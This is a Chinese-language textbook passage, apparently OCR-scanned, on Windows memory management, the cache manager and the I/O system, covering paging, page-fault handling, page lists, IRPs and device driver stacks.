这一系统包括了大量Win32函数，这些函数通过内存管 理器 (NTOS 执行层最大的组件)来实现。
在下面章节中，我们将依次了解它的基本概念、Win32 的 API 调用以及它的实现。
11.5.1 基本概念
在Windows系统中，每个用户进程都有它自己的虚拟地址空间。
对于x86机器，虚拟地址是32位 的；因此，每个进程拥有4GB大小的虚拟地址空间。
用户态进程和内核进程各自占用2GB。
对 于x64机 器而言，在可预见的将来，不管是用户态进程还是内核态进程都会占用比理论上更多的虚拟地址空间。
对 于x86 和x64 机器，虚拟地址空间需要分页，并且页的大小一般都是固定在4KB—— 虽然在有些情况下 每页的大小也可被分为2MB (通过只使用页目录而忽略掉页表)。
图11-28表示了三个x86进程的虚拟地址空间。
每个进程的底部和顶端64KB 的虚拟地址空间通常保 留不用。
这种做法是为了辅助发现程序错误和减轻某些确定类型的漏洞的隐患而设置的。
图11-28 x86三个用户进程的虚拟地址空间。
白色的区域为每个进程私有的。
阴影的区域为所有的进程共享
从64KB开始为用户私有的代码和数据。
这些空间可以扩充到几乎2GB 。
而最顶端的2GB 包含了操作 系统部分，包括代码、数据、换页内存池和非换页内存池。
除了每一进程的虚拟内存数据(像页表和工 作集的列表),上面的2GB 全部作为内核的虚拟内存、并在所有的用户进程之中共享。
内核虚拟内存仅在 内核态才可以访问。
共享进程在内核部分的虚拟内存的原因是：当一个线程进行系统调用的时候，它陷 入内核态之后不需要改变内存映射。
所有要做的只是切换到线程的内核栈。
从性能上看，这是一个巨大 的成功，这也是UNIX 正在做的一些东西。
由于进程在用户态下的页面仍然是可访问的，内核态下的代码 在读取参数和访问缓冲时，就不用在地址空间之间来回切换，或者临时将页面进行两次映射。
这里的权 衡是用较小的进程私有地址空间来换取更快的系统调用。
当运行在内核态的时候，Windows 允许线程访问其余的地址空间。
这样该线程就可以访问所有用户 态的地址空间，以及对该进程来说通常不可访问的内核地址空间中的区域，例如页表的自映射区域。
在
线程切换到用户态之前，必须切换到它最初的地址空间。
1.虚拟地址分配
虚拟地址的每页处于三种状态之一：无效、保留或提交。
无效页面 (invalid page) 是指一个页面没 有被映射到一个内存区对象 (section object),对它的访问会引发一个相应的页面失效。
一旦代码或数据 被映射到虚拟页面，就说一个页面处于提交(committed) 状态。
在提交的页上发生页面失效会导致如下 情况：将一个包含了引起失效的虚拟地址的页面映射到这样的页面——由内存区对象所表示，或被保存 于页面文件之中。
这种情况通常发生在需要分配物理页面，以及对内存区对象所表示的文件进行I/O来从 硬盘读取数据的时候。
但是页面失效的发生也可能是页表正在更新而造成的，即物理页面仍在内存的高 速缓存中，这种情况下不需要进行I/O。
这些叫作软异常 (soft fault),稍后我们会更详细地讨论它们。
虚拟页面还可以处于保留的 (reserved) 状态。
保留的虚拟页是无效的，但是这些页面不能被内存 管理器用于其他目的而分配。
例如，当创建一个新线程时，用户态栈空间的许多页保留于进程的虚拟地 址空间，仅有一个页面是提交的。
当栈增长时，虚拟内存管理器会自动提交额外的页面，直到保留页面 耗尽。
保留页面的功效是：可以保证栈不会太长而覆盖其他进程的数据。
保留所有的虚拟页意味着栈最 终可以达到它的最大尺寸；而栈所需要的连续虚拟地址空间的页面，也不会有用于其他用途的风险。
除 了无效、保留、提交状态，页面还有其他的属性：可读、可写及可运行(在AMD64兼容的处理器下)。
2. 页面文件
关于后备存储器的分配有一个有趣的权衡，已提交页面没有被映射于特定文件。
这些页使用了页面 文件 (pagefile) 。
问题是该如何以及何时把虚拟页映射到页面文件的特定位置。
一个简单的策略是：当 一个页被提交时，为虚拟页分配一个硬盘上页面文件中的页。
这会确保对于每一个有必要换出内存的已 提交页，都有一个确定的位置写回去。
Windows 使用一个适时 (just-in-time) 策略。
直到需要被换出内存之前，在页面文件中的具体空间 不会分配给已提交的页面。
硬盘空间当然不需要分配给永远不换出的页面。
如果总的虚拟内存比可用的 物理内存少，则根本不需要页面文件。
这对基于Windows的嵌入式系统是很方便的。
这也是系统启动时 的方式，因为页面文件是在第一个用户态进程smss.exe 启动之后才初始化的。
在预分配策略下，用于私有数据(如栈、写时复制代码页)的全部虚拟内存受到页面文件大小的限 制。
通过适时分配的策略，总的虚拟内存大小是物理内存和页面文件大小的总和。
既然相对物理内存来 说硬盘足够大与便宜，提升性能的需求自然比空间的节省更重要。
有关请求调页，需要马上进行初始化从硬盘读取页的请求——因为在页入(page-in) 操作完成之前， 遇到页面失效的线程无法继续运行下去。
对于失效页面的一个可能的优化是：在进行一次I/O操作时预 调入一些额外的页面。
然而，对于修改过的页写回磁盘和线程的执行一般并不是同步的。
用于分配页面 文件空间的适时策略便是利用这一点，在将修改过的页面写入页面文件时提升性能：修改过的页面被集 中到一起，统一进行写入操作。
由于只有当页面被写回时页面文件的空间才真正被分配，可以通过排列 使页面文件中的页面较为接近甚至连续，来对大批写回页面时的寻找次数进行优化。
Windows 支持多达16个页面文件，通常分布到不同的磁盘来达到较高的I/O带宽。
每一个页面文件 都有初始的大小和随后依需要可以增长到的最大空间，但是在系统安装时就创建这些文件达到它的最大 值是最好的。
如果当文件系统非常满却需要增长页面文件时，页面文件的新空间可能会由多个碎片所组 成，这会降低系统的性能。
操作系统通过为进程的私有页写入映射信息到页表入口，或与原页表入口相对应的共享页的内存区 对象，来跟踪虚拟页与页面文件的映射关系。
除了被页面文件保留的页面外，进程中的许多页面也被映
实例研究2: Windows 8 527
射到文件系统中的普通文件。
程序文件中的可执行代码和只读数据(例如EXE或DLL) 可以映射到任何进程正在使用的地址空间。
因为这些页面无法被修改，它们从来不需要换出内存，然而在页表映射全部被标记为无效后，可以立即 重用物理页面。
当一个页面在今后再次需要时，内存管理器将从程序文件中将其读入。
有时候页面开始时为只读但最终被修改。
例如，当调试进程时在代码中设定中断点，或将代码重定 向为进程中不同的地址，或对于开始时为共享的数据页面进行修改。
在这些情况下，像大多数现代操作 系统一样，Windows 支持写时复制(copy-on-write) 类型的页面。
这些页面开始时像普通的被映射页面 一样，但如果试图修改任何部分页面，内存管理器将会建立一份私有的、可写的副本。
然后它更新虚拟 页面的页表，使之指向那个私有副本，并且使线程重新进行写操作——这一次将会成功。
如果这个副本 之后需要被换出内存，那么它将被写回到页面文件而不是原始文件中。
除了从EXE和DLL文件映射程序代码和数据，一般的文件都可以映射到内存中，使得程序不需要进 行显式的读写操作就可以从文件引用数据。
I/O 操作仍然是必要的，但它们由内存管理器通过使用内存 区对象隐式提供，来表示内存中的页面和磁盘中的文件块的映射。
内存区对象并不一定和文件相关。
它们可以和匿名内存区域相关。
通过映射匿名内存区对象到多个 进程，内存可以在不分配磁盘文件的前提下共享。
既然内存区可以在NT名字空间给予名字，进程可以 通过用名字打开内存区对象、或者复制进程间的内存区对象句柄的方式来进行通信。
11.5.2 内存管理系统调用
Win32 API 包含了大量的函数来支持一个进程显式地管理它自己的虚拟内存，其中最重要的函数如 图11-29所示。
它们都是在包含一个单独的页或由两个或多个在虚拟地址空间中连续页序列的区域上进 行操作的。
当然，进程不是一定要去管理它们的内存；分页自动完成，但是这些系统调用给进程提供了 额外的能力和灵活性。
图11-29 Windows中用来管理虚拟内存的主要的Win32 API函数
能够使用它。
接下来的两个函数从一个进程的虚拟地址空间中映射或取消映射内存区对象之上的视图。
最后一个API能被一个进程用来映射其他进程通过调用CreateFileMap ping 创建并共享出来的映射，这 样的映射通常是为了映射匿名内存而建立的。
通过这样的方式，两个或多个进程能够共享它们地址空间 中的区域。
这一技术允许它们写内容到彼此的虚拟内存的受限的区域中。
11.5.3 存储管理的实现
运行在x86 处理器上的Windows 操作系统为每个进程都单独提供了一个4GB 大小的按需分页 (demand-paged) 的线性地址空间，不支持任何形式的分段。
从理论上说，页面的大小可以是不超过 64KB的2的任何次幂。
但是在x86处理器上，页面正常情况下固定地设置成4KB大小。
另外，操作系统 可以使用4MB的页来改进处理器存储管理单元中的快表 (Translation Lookaside Buffer,TLB)的效率。
内核以及大型应用程序使用了4MB大小的页面以后，可以显著地提高性能。
这是因为TLB的命中率提高 了，并且访问页表以寻找在TLB表中没有找到的表项的次数减少了。
调度器选择单个线程来运行而不太关心进程，存储管理器则不同，它完全是在处理进程而不太关心 线程。
毕竟，是进程而非线程拥有地址空间，而地址空间正是存储管理器所关心的。
当虚拟地址空间中 的一片区域被分配之后，就像图11-30中进程A已被分配的4片区域那样，存储管理器会为它创建一个虚拟 地址描述符 (Virtual Address Descriptor,VAD) 。
VAD列出了被映射地址的范围，用来表示作为后备存储 的文件以及文件被映射区域起始位置的节区以及权限。
当访问第一个页面的时候，创建一个页目录并且 把它的物理地址插入进程对象中。
一个地址空间被一个VAD的列表所完全定义。
VAD 被组织成平衡树的 形式，从而保证一个特定地址的描述符能够被快速地找到。
这个方案支持稀疏的地址空间。
被映射的区 域之间未使用的地址空间不会使用任何内存中或磁盘上的资源，从这个意义上说，它们是“免费”的。
磁盘上的后备存储
进程B 堆栈
区域{ 数据
数据
页面文件
共享库
lib/dll
共享库
程序
程序
prog1.exe prog2.exe
图11-30 被映射的区域以及它们在磁盘上的“影子”页面。
lib.dl 文件被同时映射到两个地址空间中
1.页面失效处理
当在Windows 上启动一个进程的时候，很多映射了程序的EXE 和DLL映像文件的页面可能已经在内 存中，这是因为它们可能被其他进程共享。
映像中的可写页面被标记成写时复制 (copy-on-write), 使 得它们能一直被共享，直到内容要被修改的那一刻。
如果操作系统从一次过去的执行中认出了这个EXE, 它可能已经通过使用微软称之为超级预读取(S uperFetch) 的技术记录了页面引用的模式。
超级预读取 技术尝试预先读入很多需要的页面到内存中，尽管进程尚未在这些页面上发生页面失效。
这一技术通过 重叠从磁盘上读入页面和执行映像中的初始化代码，减小了启动应用程序所需的延时。
同时，它改进了 磁盘的吞吐量，因为使用了超级预读取技术以后，磁盘驱动器能够更轻易地组织对磁盘的读请求来减少 所需的寻道时间。
进程预约式页面调度 (prepaging) 技术也用到了系统启动、把后台应用程序移到前台 以及休眠之后重启系统当中。
存储管理器支持预约式页面调度，但是它被实现成系统中一个单独的组件。
被读入到内存的页面时不是 插入到进程的页表中，而是插入到后备列表中，从而使得在需要时可以不访问磁盘就将它们插入到进程中。
未被映射的页面稍微有些不同。
它们没有被通过读取文件来初始化。
相反， 一个未被映射的页面第 一次被访问的时候，存储管理器会提供一个新的物理页面，该页面的内容被事先清零(为了安全方面的 原因)。
在后续的页面失效处理过程中，未被映射的页面可能会被从内存中找到，否则的话，它们必须 被从页面文件中重新读入内存。
存储管理器中的按需分页是通过页面失效来驱动的。
在每次页面失效发生的时候，会发生一次到内 核的陷入。
内核将建立一个说明发生了什么事情的机器无关的描述符，并把该描述符传递给存储管理器 相关的执行部件。
存储管理器接下来会检查引发页面失效的内存访问的有效性。
如果发生页面失效的页 面位于一个已提交的区域内，存储管理器将在VAD列表中查找页面地址并找到(或创建)进程页表项。
对于共享页面的情况，存储管理器使用与内存区对象关联的原始页表项来填写进程页表中的新页表项。
不同处理器体系结构下的页表项的格式可能会不同。
对于x86和×64,一个被映射页面的页表项如 图11-31所示。
如果一个页表项被标记为有效，它的内容会被硬件读取并解释，从而虚拟地址能够转换 成正确的物理地址。
未被映射的页面也有对应的页表项，但是这些页表项被标记成无效，硬件将忽略这 些页表项除该标记之外的部分。
页表项的软件格式与硬件格式有所不同，软件格式由存储管理器决定。
例如，对于一个未映射的页面，它必须在使用前分配和清零，这一点可以通过页表项来表明。
页表项中有两个重要的位是硬件直接更新的，它们是访问位 (access bit) 和脏位 (dirty bit)。
这两 个位跟踪了什么时候一个特定的页面映射用来访问该页面以及这个访问是否以写的方式修改了页面的内 容。
这确实很有助于提高系统性能。
因为存储管理器可以使用访问位来实现LRU(Least-Recently Used, 最近最少使用)类型的页面替换策略。
LRU 原理是，那些最长时间没有被使用过的页面有最小的可能性 在不久的将来被再次使用。
访问位使存储管理器知道一个页面被访问过了，脏位使存储管理器知道一个 页面被修改了，或者更重要的是，一个页面没有被修改。
如果一个页面自从从磁盘上读到内存后没有被 修改过，存储管理器就没有必要在将该页面用到其他地方之前将页面内容写回磁盘了。
正如图11-33所示，x86 和x64体系结构都使用64位大小的页表项。
31 1211987654321 0
6362 5251 121198 7 6 5 4 3 2 1 0
NX-No eXecute
AVL-AVaiLable to the OS G-Global page
PAT-Page Attribute Table D-Dirty(modified)
A-Accessed (referenced)
a)
PCD-Page Cache Disable PWT-Page Write-Through U/S-User/Supervisor
RW-Read/Write access P-Present (valid)
b)
图11-31 一个Intel x86体系结构和AMDx64 体系结构上的已映射页面的页表项 (PTE)
每个页面失效都可以归入以下五类中的一类：
1)所引用的页面没有提交。
2)尝试违反权限的页面访问。
3)修改一个共享的写时复制页面。
4)需要扩大栈。
5)所引用的页已经提交但是当前没有映射。
第一种和第二种情况是由于编程错误引起。
如果一个程序试图使用一个没有有效映射的地址或试图
进行一个称为访问违例 (access violation)的无效操作(例如试图写一个只读的页面),通常的结果是， 这个进程会被终止。
访问破坏的原因通常是坏指针，包括访问从进程释放的和被解除映射的内存。
第三种情况与第二种情况有相同的症状(试图写一个只读的页面),但是处理方式是不一样的。
因 为页面已经标记为写时复制，存储管理器不会报告访问违例，相反它会为当前进程产生一个该页面的私 有副本，然后返回到试图写该页面的线程。
该线程将重试写操作，而这次的写操作将会成功完成而不会 引发页面失效。
第四种情况在线程向栈中压入一个值，而这个值会被写到一个还没有被分配的页面的情况下发生。
存储管理器程序能够识别这种特殊情况。
只要为栈保留的虚拟页面还有空间，存储管理器就会提供一个 新的物理页面，将该页面清零，最后把该页面映射到进程地址空间。
线程在恢复执行的时候会重试上次 引发页面失效的内存访问，而这次该访问会成功。
最后，第五种情况就是常见的页面失效。
这种异常包含下述几种情况。
如果该页是由文件映射的， 内存管理器必须查找该页与内存区对象结合在一起的原型页表等类似的数据结构，从而保证在内存中不 存在该页的副本。
如果该页的副本已经在内存中，即在另一个进程的页面链表已经存在该页面的副本， 或者在后备、已修改页链表中，则只需要共享该页即可。
否则，内存管理器分配一个空闲的物理页面， 并安排从磁盘复制文件页，除非另外一个页面正在从磁盘中转变，这种情况的话只能等到转变结束之后 再去执行。
当一个物理页面不再映射到任何进程的页表，将进入以下三种状态之一：空闲、已修改或后备。
内 存管理器会立刻释放那些类似已结束进程的栈页面这样不再会使用的页面。
根据判断映射页面的页表项 中的上次从磁盘读出后的脏位是否设置，页面可能会再次发生异常，从而进入已修改链表或者后备链表 (standby list)。
已修改链表中的页面最终会写回磁盘，然后移到后备链表中。
内存管理器可以根据需要从空闲链表或者后备链表中分配页面。
它在分配页面并从磁盘复制之前， 总是在已修改链表和后备链表中检查该页面是否已经在内存中。
Windows Vista中的预约式调页机制通过 读入那些未来可能会用到的页面并把它们插入后备链表的方式将硬异常转化为软异常。
内存管理器通过 读入成组的连续页面而不是仅仅一个页面来进行一定数量的普通预约式调页。
多余调入的页面立刻插入 后备链表。
而由于内存管理器的开销主要是进行I/O操作引起的，因而预约式调页并不会带来很大的浪 费。
与读入一簇页面相比，仅读入一个页面的额外开销是可以忽略的。
图11-31中的页表项指的是物理页号，而不是虚拟页号。
为了更新页表(以及页目录)项，内核需
要使用虚拟地址。
Windows 使用如图11-32所示的页目录表项中的自映射 (self-map) 表项将当前进程的
页表和页目录映射到内核虚拟地址空间。
通过映射页目录项到页目录(自映射),就具有了能用来指向 页目录项(图11-32a) 和页表项(图11-32b) 的虚拟地址。
每个进程的自映射占用同样的8MB内核地址 空间 (x86 上)。
为了简化，图11-32中只显示了x86上的32位页表项自映射。
Windows 实际上使用的是64 位的页表项，这样系统能够利用超过4GB大小的物理内存。
对于32位的页表项，自映射在页目录中只用 了一个页目录项，所以只占用了4MB的地址空间，而不是8MB。
2. 页面置换算法
当空闲物理页面数量降得较低时，内存管理器开始从内核态的系统进程以及用户态进程移走页面。
目标就是使得最重要的虚拟页面在内存中，而其他的在磁盘上。
决定什么是重要的需要技巧。
Windows 通过大量使用工作集来解决这一问题。
工作集处在内存中，不需要通过页面失效即可使用的映射入内存 的页面。
当然，工作集的大小和构成随着从属于进程的线程运行来回变动。
实 例 研 究2 : Wi n d o w s 8 531
自映射：PD[0xc0300000>>22]is PD(page-directory)
虚拟地址(a):(PTE*)(0xc0300c00)points to PD[0×300]which is the self-map page directory entry 虚拟地址 to PTE for virtual address Oxe4321000
图11-32 x86 上 ，Windows 用来映射页表和页目录的物理页面到内核虚拟地址的自映射表项
1) 大量的可用内存：扫描页面，复位页面的访问位，并使用访问位的值来表示每个页面的新旧程度。
在每个工作集内保留使用一个估算数量的未使用页面。
3)内存紧缺：消减(也即减小)工作集，通过移除最旧的页面从而降低工作集的最大值。
平衡集管理器 (balance set manager) 线程调用工作集管理器，使得其每秒都在运行。
工作集管理 器抑制一定数量的工作从而不会使得系统过载。
它同时也监控要写回磁盘的已修改链表上的页面，通过 唤 醒ModifiedPageWriter 线程使得页面数量不会增长得过快。
3.物理内存管理
上面提到了物理页面的三种不同链表，空闲链表、后备链表和已修改链表。
除此以外还有第四种链 表，即全部被填零的空闲页面。
系统会频繁地请求全零的页面。
当为进程提供新的页面，或者读取一个 文件的最后部分不足一个页面时，需要全零页面。
将一个页面写为全零是需要时间的，因此在后台使用 低优先级的线程创建全零页是一个较好的方式。
另外还有第五种链表存放有硬件错误的页面(即通过硬 件错误检测)。
系统中的所有页面要么由一个有效的页表项索引，要么属于以上五种链表中的一种，它们的全体称 为页框号数据库 ( PFN 数据库)。
图11-33表明PFN 数据库的结构。
该表格由物理页框号索引。
表项都是 固定长度的，但是不同类型的表项使用不同的格式(例如共享页面相对于私有页面)。
有效的表项维护 页面的状态以及指向该页面数量的计数。
工作集中的页面指出哪个表项索引它们。
还有一个指向该页的 进程页表的指针(非共享页),或者指向原型页表的指针(共享页)。
页帧数据库
图11-33 一个有效的页面在页框数据库上的一些主要域
工作集管理器和其他的系统线程控制页面在工作集和不同的链表间移动。
下面对这些转变进行研究。
当工作集管理器将一个页面从某个工作集中去掉，则该页面按照自身是否修改的状态进入后备或已修改 链表的底部。
这一转变在图11-34的(1)中进行了说明。
这两个链表中的页面仍然是有效的页面，当页面失效发生的时候需要它们中的一个页，则将该页移 回工作集而不需要进行磁盘I/O操作(2)。
当一个进程退出，该进程的非共享页面不能通过异常机制回 到以前的工作集，因此该进程页表中的有效页面以及挂起和已修改链表中的页面都移入空闲链表(3)。
任何该进程的页面文件也得到释放。
其他的系统调用会引起别的转变。
平衡集管理器线程每4秒运行一次来查找那些所有的线程都进入 空闲状态超过一定秒数的进程。
如果发现这样的进程，就从物理内存去掉它们的内核栈，这样的进程的 页面也如(1)一样移动到后备链表或已修改链表。
实例研究2: Windows 8 533
顶部取出页面，写回到磁盘，然后将这些页面插入后备链表(4)。
前者处理对于映射文件的写，而后者 处理页面文件的写。
这些写的结果就是将已修改(脏)页面移到后备(干净)链表中。
之所以使用两个线程是因为映射文件可能会因为写的结果增长，而增长的结果就需要对磁盘上的数 据结构具有相应的权限来分配空闲磁盘块。
当一个页面被写入时如果没有足够的内存，就会导致死锁。
另一个线程则是解决向页面文件写入页时的问题。
下面说明图11-34中另一个转换。
如果进程解除页映射，该页不再和进程相关从而进入空闲链表(5), 当该页是共享的时候例外。
当页面失效会请求一个页框给将要读入的页，此时该页框会尽可能从空闲链 表中取下(6)。
由于该页会被全部重写，因此即使有机密的信息也没有关系。
所有这些链表的存在导致了一些微妙的策略抉择。
例如，假设要从磁盘载入一个页面，但是空闲链 表是空的，那么,要么从后备链表中取出一个干净页(虽然这样做稍后有可能导致缺页),要么从全零 页面链表中取出一个空页(忽略把该页清零的代价),系统必须在上述两种策略之间做出选择。
哪一个 更好呢?
内存管理器必须决定系统线程把页面从已修改链表移动到后备链表的积极程度。
有干净的页面后备 总比有脏页后备好得多(因为如有需要，干净的页可以立即重用),但是一个积极的净化策略意味着更 多的磁盘I/O, 同时一个刚刚净化的页面可能由于缺页中断重新回到工作集中，然后又成为脏页。
通常 来 讲 ，Windows 通过算法、启发、猜测、历史、经验以及管理员可控参数的配置来做权衡。
总而言之，内存管理需要一个拥有多种数据结构、算法和启发性的十分复杂、重要的组件。
它尽可 能地自我调整，但是仍然留有很多选项使系统管理员可以通过配置这些选项来影响系统性能。
大部分的 选项和计数器可以通过工具浏览，相关的各种工具包在前面都有提到。
也许在这里最值得记住的就是， 在真实的系统里，内存管理不仅仅是一个简单的时钟或老化的页面算法。
11.6 Windows的高速缓存
Windows高速缓存 (cache) 通过把最近和经常使用的文件片段保存在内存中的方式来提升文件系统的 性能。
高速缓存管理器管理的是虚拟寻址的数据块，也就是文件片段，而不是物理寻址的磁盘块。
这种方 法非常适合NTFS文件系统，如11.8节所示。
NTFS 把所有的数据作为文件来存储，包括文件系统的元数据。
高速缓存的文件片段称为视图(view), 这是因为它们代表了被映射到文件系统的文件上的内核虚拟地 址片段。
所以，在高速缓存中，对物理内存的管理实际上是由内存管理器提供的。
高速缓存管理器的作用 是为视图管理内核虚拟地址的使用，命令内存管理器在物理内存中钉住页面，以及为文件系统提供接口。
Windows高速缓存管理器工具在文件系统中被广泛地共享。
这是因为高速缓存是根据独立的文件来虚 拟寻址的，高速缓存管理器可以在每个文件的基础上很轻易地实现预读取。
访问高速缓存数据的请求来自 于每个文件系统。
由于文件系统不需要先把文件的偏移转换成物理磁盘号然后再请求读取高速缓存的文 件页，所以虚拟缓存非常方便。
类似的转换发生在内存管理器调用文件系统访问存储在磁盘上的页面的 时 候 。
除了对内核虚拟地址和用来缓存的物理内存资源的管理外，考虑到视图的一致性，大批量磁盘回写， 以及文件结束标志的正确维护(特别是当文件扩展的时候),高速缓存管理器还必须与文件系统协作。
在 文件系统、高速缓存管理器和内存管理器之间管理文件最困难的方面在于文件中最后一个字节的偏移，即 有效数据长度。
如果一个程序写出了文件末尾，则越过的磁盘块都需要清零，同时为了安全的原因，在文 件的元数据中记录的有效数据长度不应该允许访问未经初始化的磁盘块，所以全零磁盘块在文件元数据更 新为新的长度之前必须写回到磁盘上。
然而，可以预见的是，如果系统崩溃，一些文件的数据块可能还没 有按照内存中的数据进行更新，还有一些数据块可能含有属于其他文件的数据，这都是不能接受的。
现在让我们来看看高速缓存管理器是如何工作的。
当一个文件被引用时，高速缓存管理器映射一块 大小为256KB的内核虚拟地址空间给文件。
如果文件大于256KB, 那么每次只有一部分文件被映射进来。
如果高速缓存管理器耗尽了虚拟地址空间中大小为256KB的块，那么,它在映射一个新文件之前必须释 放一个旧的文件。
文件一旦被映射，高速缓存管理器通过把内核虚拟地址空间复制到用户缓冲区的方式 来满足对该数据块的请求。
如果要复制的数据块不在物理内存当中，会发生缺页中断，内存管理器会按 照通常的方式处理该中断。
高速缓存管理器甚至不知道一个数据块是不是在内存当中。
复制总是成功的。
11.7 Windows的I/O
11.7.1 基本概念
Windows的一个有趣的特点是支持动态磁盘 (dynamic disk)。
这些磁盘可以跨越多个分区，或多个 磁盘，甚至无需重新启动在使用中就可以重新配置。
通过这种方式，逻辑卷不再被限制在一个单一的分 区或磁盘内，一个单一的文件系统也可以透明地跨越多个驱动器。
从I/O到卷可被一个特殊的Windows驱动程序过滤产生卷阴影副本 (volum e shadow copy)。
过滤驱 动程序创建一个可单独挂载的，并代表某一特定时间点的卷快照。
为此，它会跟踪快照点后的变化。
这
对恢复被意外删除的文件或根据定期生成的卷快照查看文件过去的状态非常方便。
11.7.2 I/O的API调 用
由I/O管理器提供的API与大多数操作系统提供的API并没有很大的不同。
基本操作有open 、read、
write 、ioctl和close, 以及即插即用和电源操作、参数设置、刷新系统缓冲区等。
在Win32层，这些API被包 装成接口，向特定的设备提供了更高一级的操作。
在底层，这些API打开设备，并执行这些基本类型的操作。
即使是对一些元数据的操作，如重命名文件，也没有用专门的系统调用来实现。
它们只是特殊的ioct| 操作。
在我们解释了I/O设备栈和I/O管理器使用的I/O请求包 (IRP) 之后，读者将对上面的陈述更有体会。
保持了Windows 一贯的通用哲学，原生NT I/O系统调用带有很多参数并包括很多变种。
图11-35列 出 了I/O 管理器中主要的系统调用接口。
NtCreateFile 用于打开已经存在的或者新的文件。
它为新创建
图11-35 执行I/O的原生NT API调用
的文件提供了安全描述符和一个对被请求的访问权限的详细描述，并使得新文件的创建者拥有了一些如 何分配磁盘块的控制权。
Nt ReadFile 和NtWriteFile 需要文件句柄、缓冲区和长度等参数。
它们也需要一 个明确的文件偏移量的参数，并且允许指定一个用于访问文件锁定区域字节的钥匙。
正如上面提到的， 大部分的参数都和指定哪一个函数来报告(很可能是异步) I/O 操作的完成有关。
NtQuerydirectoryFile 是一个在执行过程中访问或修改指定类型对象信息的标准模式的一个例子， 在这种模式中存在多种不同的查询API。
在本例中，指定类型的对象是指与某些目录相关的一些文件对 象。
一个参数用于指定请求什么类型的信息，比如目录中的文件名列表，或者是经过扩展的目录列表所 需要的每个文件的详细信息。
由于它实际上是一个I/O操作，因此它支持所有的报告I/O 操作已完成的标 准方法。
NtQueryVolumelnformationFile 很像是目录查询操作，但是与目录查询操作不同的是，它有一 个参数是打开的卷的文件句柄，不管这个卷上是否有文件系统。
与目录不同的是，卷上有一些参数可以 修改，因此这里有了单独用于卷的API NtSetVolumelnformationFile。
这些系统调用本质上是特定于文件的ioctl 的一种形式。
这组操作可以用来重命名或删除一个文件。
但是请注意，它们处理的并不是文件名，所以要重命名或删除一个文件之前必须先打开这个文件。
它们 也可以被用来重新命名NTFS上的交换数据流(见11.8节)。
存在独立的API(NtLockFile 和NtUnlockFile) 用来设置和删除文件中字节域的锁。
通过使用共享 模 式 ，NtCreateFile 允许访问被限制的整个文件。
另一种选择是这些锁API, 它们用来强制访问文件中 受限制的字节域。
读操作和写操作必须提供一个与提供给NtLockFile 的密钥相符合的密钥，以便操作被 锁定的区域。
UNIX 中也有类似的功能，但在UNIX 中应用程序可以自由决定是否认同这个区域锁。
NtFsControlFile 和前面提到的查询和设置操作很相像，但它是一个旨在处理特定文件的操作，其他的 API并不适合处理这种文件。
例如，有些操作只针对特定的文件系统。
11.7.3 I/O实 现
1.设备驱动程序
为了确保设备驱动程序能和Windows的其余部分协同工作，微软公司定义了设备驱动程序需要符合 的Windows 驱动程序模型 (WDM) 。
Windows 开发工具箱 (Windows Driver Kit,WDK) 包含文档说明 以及样本示例用来帮助驱动程序开发人员开发满足WDM的驱动)。
大部分Windows驱动程序的开发过程 都是先从WDK复制一份合适的简单的驱动程序，然后修改它。
微软公司也提供一个驱动程序验证器，用以验证驱动程序的多个行为以确保驱动程序符合Windows 驱动程序模型的结构要求和I/O 请求的协议要求、内存管理等。
操作系统中带有此验证器，管理员可能 通过运行verifier.exe 来控制驱动程序验证器，验证器允许管理员配置要验证哪些驱动程序以及在怎样的 范围(多少资源)内验证这些驱动程序。
即使有所有的驱动程序开发和验证支持，在Windows中写一个简单的驱动程序仍然是非常困难的事 情，因此微软建立了一个叫作WDF (Windows 驱动程序基础)的包装系统，它运行在WDM顶层，简化 了很多更普通的需求，主要和驱动程序与电源管理和即插即用操作之间的正确交互有关。
在Windows中，设备是由设备对象描述的。
设备对象也用于描述硬件(例如总线),软件抽象(例 如文件系统、网络协议),还可以描述内核扩展(例如病毒过滤器驱动程序)。
上面提到的这些设备对象 都是由Windows中的设备栈来组织的，见前面的图11-16。
I/O操作从I/O管理器调用可执行API loCallDriver程序开始，loCallDriver 带有指向顶层设备对象和 描述I/O 请求的IRP的指针。
这个例程可以找到与设备对象联合在一起的驱动程序。
在IRP中指定操作类 型通常都符合前面讲过的I/O管理器系统调用，例如创建、读取和关闭。
图11-36表示的是一个设备栈在单独一层上的关系。
驱动程序必须为每个操作指定一个进入点。
loCallDriver 从IRP中获取操作类型，利用在当前级别的设备栈中的设备对象来查找指定的驱动程序对象， 并且根据操作类型索引到驱动程序分派表去查找相应驱动程序的进入点。
最后会把设备对象和IRP传递 给驱动程序并调用它。
图11-36 设备栈中的单独一层
一旦驱动程序完成处理IRP 描述的请求后，它将有三种选择。
第一，驱动程序可以再一次调用 loCallDriver, 把IRP和设备栈中的下一个设备对象传递给相应的驱动程序。
第二，驱动程序也可以声明 I/O 请求已经完成并返回到调用者。
第三，驱动程序还可以在内部使IRP排队并返回到调用者，同时声明 I/O 请求仍未处理。
后一种情况下，如果栈上的所有驱动都认可挂起行为且返回各自的调用者，则会引 起 一 次 异 步I/O 操 作 。
2.I/O请求包
图11-37表示的是IRP 中的主要的域。
IRP 的底部是一个动态大小的数组，包含那些被设备栈管理请 求的域，每个驱动程序都可以使用这些域。
在完成一次I/O 请求的时候，这些设备栈的域也允许驱动程 序指定要调用哪个例程。
在完成请求的过程中，按倒序访问设备栈的每一级，并且依次调用由每个应用 程序指定的完成例程。
在每一级，驱动程序可以继续执行以完成请求，也可以因为还有更多的工作要做 从而决定让请求处于未处理状态并且暂停I/O的完成。
图11-37 I/O请求包的主要域
当I/O 管理器分配一个IRP 时，为了分派一个足够大的IRP, 它必须知道这个设备栈的深度。
在建立 设备栈的时候，I/O管理器会在每一个设备对象的域中记录栈的深度。
注意，在任何栈中都没有正式地 定义下一个设备对象是什么。
这个信息被保存在栈中当前驱动程序的私有数据结构中。
事实上这个栈实 际上并不一定是一个真正的栈。
在每一层栈中，驱动程序都可以自由地分配新的IRP, 或者继续使用原 来的IRP, 或者发送一个I/O 操作给另一个设备栈，或者甚至转换到一个系统工作线程中继续执行。
IRP 包含标志位、索引到驱动程序分派表的操作码、指向内核与用户缓冲区的指针和一个MDL ( 内 存描述符列表)列表。
MDL 用于描述由缓冲区描述的物理内存框，也就是用于DMA 操作。
有一些域用 于取消和完成操作。
当I/O 操作已经完成后，在处理IRP时用于排列这个IRP 到设备中的域会被重用。
目 的是给用于在原始线程的上下文中调用I/O 管理器的完成例程的APC 控制对象提供内存。
还有一个连接 域用于连接所有的外部IRP到初始化它们的线程。
3.设备栈
Windows 中的驱动程序可以自己完成所有的任务，如图11-38所示的打印机驱动程序。
